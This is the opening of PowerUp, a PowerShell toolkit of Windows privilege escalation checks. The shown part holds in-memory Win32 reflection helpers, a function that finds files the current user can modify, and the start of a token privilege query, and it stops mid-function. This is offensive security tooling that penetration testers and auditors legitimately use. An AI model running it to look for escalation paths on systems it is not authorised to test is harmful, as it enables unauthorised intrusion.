<#

PowerUp aims to be a clearinghouse of common Windows privilege escalation
vectors that rely on misconfigurations. See README.md for more information.

Author: @harmj0y
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

#>

#Requires -Version 2


########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# PowerUp Helpers
#
########################################################

function Get-ModifiablePath {
<#
.SYNOPSIS

Parses a passed string containing multiple possible file/folder paths and returns
the file paths where the current user has modification rights.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  
EditedBy: Tobias Neitzel (@qtc-de)

.DESCRIPTION

Takes a complex path specification of an initial file/folder path with possible
configuration files, 'tokenizes' the string in a number of possible ways, and
enumerates the ACLs for each path that currently exists on the system. Any path that
the current user has modification rights on is returned in a custom object that contains
the modifiable path, owner, associated permission set, and the IdentityReference with the
specified rights. The SID of the current user and any group he/she are a part of are used
as the comparison set against the parsed path DACLs.

.PARAMETER Path

The string path to parse for modifiable files. Required

.PARAMETER Literal

Switch. Treat all paths as literal (i.e. don't do 'tokenization').

.EXAMPLE

'"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath

Path                       Permissions                IdentityReference
----                       -----------                -----------------
C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...

.EXAMPLE

Get-ChildItem C:\ProgramData -File -Recurse -ErrorAction SilentlyContinue | Get-ModifiablePath -Literal

ModifiablePath                                            Owner                  IdentityReference        Permissions                                                                           
--------------                                            -----                  -----------------        -----------                                                                           
C:\ProgramData\chocolatey\logs\choco.summary.log          BUILTIN\Administrators BUILTIN\Users            {WriteAttributes, Synchronize, AppendData/AddSubdirectory, WriteExtendedAttributes...}
C:\ProgramData\chocolatey\logs\chocolatey.log             BUILTIN\Administrators BUILTIN\Users            {WriteAttributes, Synchronize, AppendData/AddSubdirectory, WriteExtendedAttributes...}
...

.OUTPUTS

PowerUp.TokenPrivilege.ModifiablePath

Custom PSObject containing the Permissions, Owner, ModifiablePath and IdentityReference for
a modifiable path.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Alias('LiteralPaths')]
        [Switch]
        $Literal
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        # this is an xor of GenericWrite, GenericAll, MaximumAllowed, WriteOwner, WriteDAC, AppendData/AddSubdirectory, WriteData/AddFile, Delete
        $MAccessMask = 0x520d0006
        
        # possible separator character combinations
        $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            if ($PSBoundParameters['Literal']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    $ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
                    if ($ParentPath -and (Test-Path -Path $ParentPath)) {
                        $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                    } else {
                        Write-Verbose "Skipping: $TempPath [Not Found]"
                    }
                }
            }
            else {

                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if (($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if ($TempPath -and ($TempPath -ne '')) {
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
                                        if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {}
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                
                $CandidatePath = $_

                try {
                    $Acl = Get-Acl -Path $CandidatePath -ErrorAction Stop
                    $Owner = $Acl.Owner;
                    
                    if( $Owner -notmatch '^S-1-5.*' ) {
                        if( -not $TranslatedIdentityReferences[$Owner] ) {
                            $IdentityUser = New-Object System.Security.Principal.NTAccount($Owner)
                            $TranslatedIdentityReferences[$Owner] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                        }
                        $IdentitySID = $TranslatedIdentityReferences[$Owner]
                    } else {
                        $IdentitySID = $Owner
                    }

                    # If we are owner, we have implicit full control over the object. Only the Owner property is imporant here, as the security group of an object
                    # gets ignored (https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961983(v=technet.10)?redirectedfrom=MSDN
                    if( $CurrentUserSids -contains $IdentitySID ) {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                        $out | Add-Member Noteproperty 'Owner' $Owner
                        $Out | Add-Member Noteproperty 'IdentityReference' $Owner
                        $Out | Add-Member Noteproperty 'Permissions' @('Owner')
                        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                        $Out
                    }

                } catch [System.UnauthorizedAccessException] {
                    Write-Verbose "Skipping: $CandidatePath [Access Denied]"
                    continue
                }

                $Acl | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    if( $FileSystemRights -band $MAccessMask )  {

                        $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }

                        $IdentityRef = $_.IdentityReference
                        if ($IdentityRef -notmatch '^S-1-5.*') {

                            if (-not ($TranslatedIdentityReferences[$IdentityRef])) {
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($IdentityRef)
                                try {
                                    $TranslatedIdentityReferences[$IdentityRef] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                                } catch {
                                    $TranslatedIdentityReferences[$IdentityRef] = $IdentityUser
                                }
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]

                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if ($CurrentUserSids -contains $IdentitySID) {
                            $Out = New-Object PSObject
                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                            $out | Add-Member Noteproperty 'Owner' $Owner
                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                            $Out | Add-Member Noteproperty 'Permissions' $Permissions
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                            $Out
                        }
                    }
                }
            }
        }
    }
}


function Get-TokenInformation {
<#
.SYNOPSIS

Helpers that returns token groups or privileges for a passed process/thread token.
Used by Get-ProcessTokenGroup and Get-ProcessTokenPrivilege.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

Wraps the GetTokenInformation() Win 32API call to query the given token for
either token groups (-InformationClass "Groups") or privileges (-InformationClass "Privileges").
For token groups, group is iterated through and the SID structure is converted to a readable
string using ConvertSidToStringSid(), and the unique list of SIDs the user is a part of
(disabled or not) is returned as a string array.

.PARAMETER TokenHandle

The IntPtr token handle to query. Required.

.PARAMETER InformationClass

The type of information to query for the token handle, either 'Groups', 'Privileges', or 'Type'.

.OUTPUTS

PowerUp.TokenGroup

Outputs a custom object containing the token group (SID/attributes) for the specified token if
"-InformationClass 'Groups'" is passed.

PowerUp.TokenPrivilege

Outputs a custom object containing the token privilege (name/attributes) for the specified token if
"-InformationClass 'Privileges'" is passed

PowerUp.TokenType

Outputs a custom object containing the token type and impersonation level for the specified token if
"-InformationClass 'Type'" is passed

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa379624(v=vs.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa379626(v=vs.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa379630(v=vs.85).aspx
#>

    [OutputType('PowerUp.TokenGroup')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Alias('hToken', 'Token')]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $TokenHandle,

        [String[]]
        [ValidateSet('Groups', 'Privileges', 'Type')]
        $InformationClass = 'Privileges'
    )

    PROCESS {
        if ($InformationClass -eq 'Groups') {
            # query the process token with the TOKEN_INFORMATION_CLASS = 2 enum to retrieve a TOKEN_GROUPS structure

            # initial query to determine the necessary buffer size
            $TokenGroupsPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)
            [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)

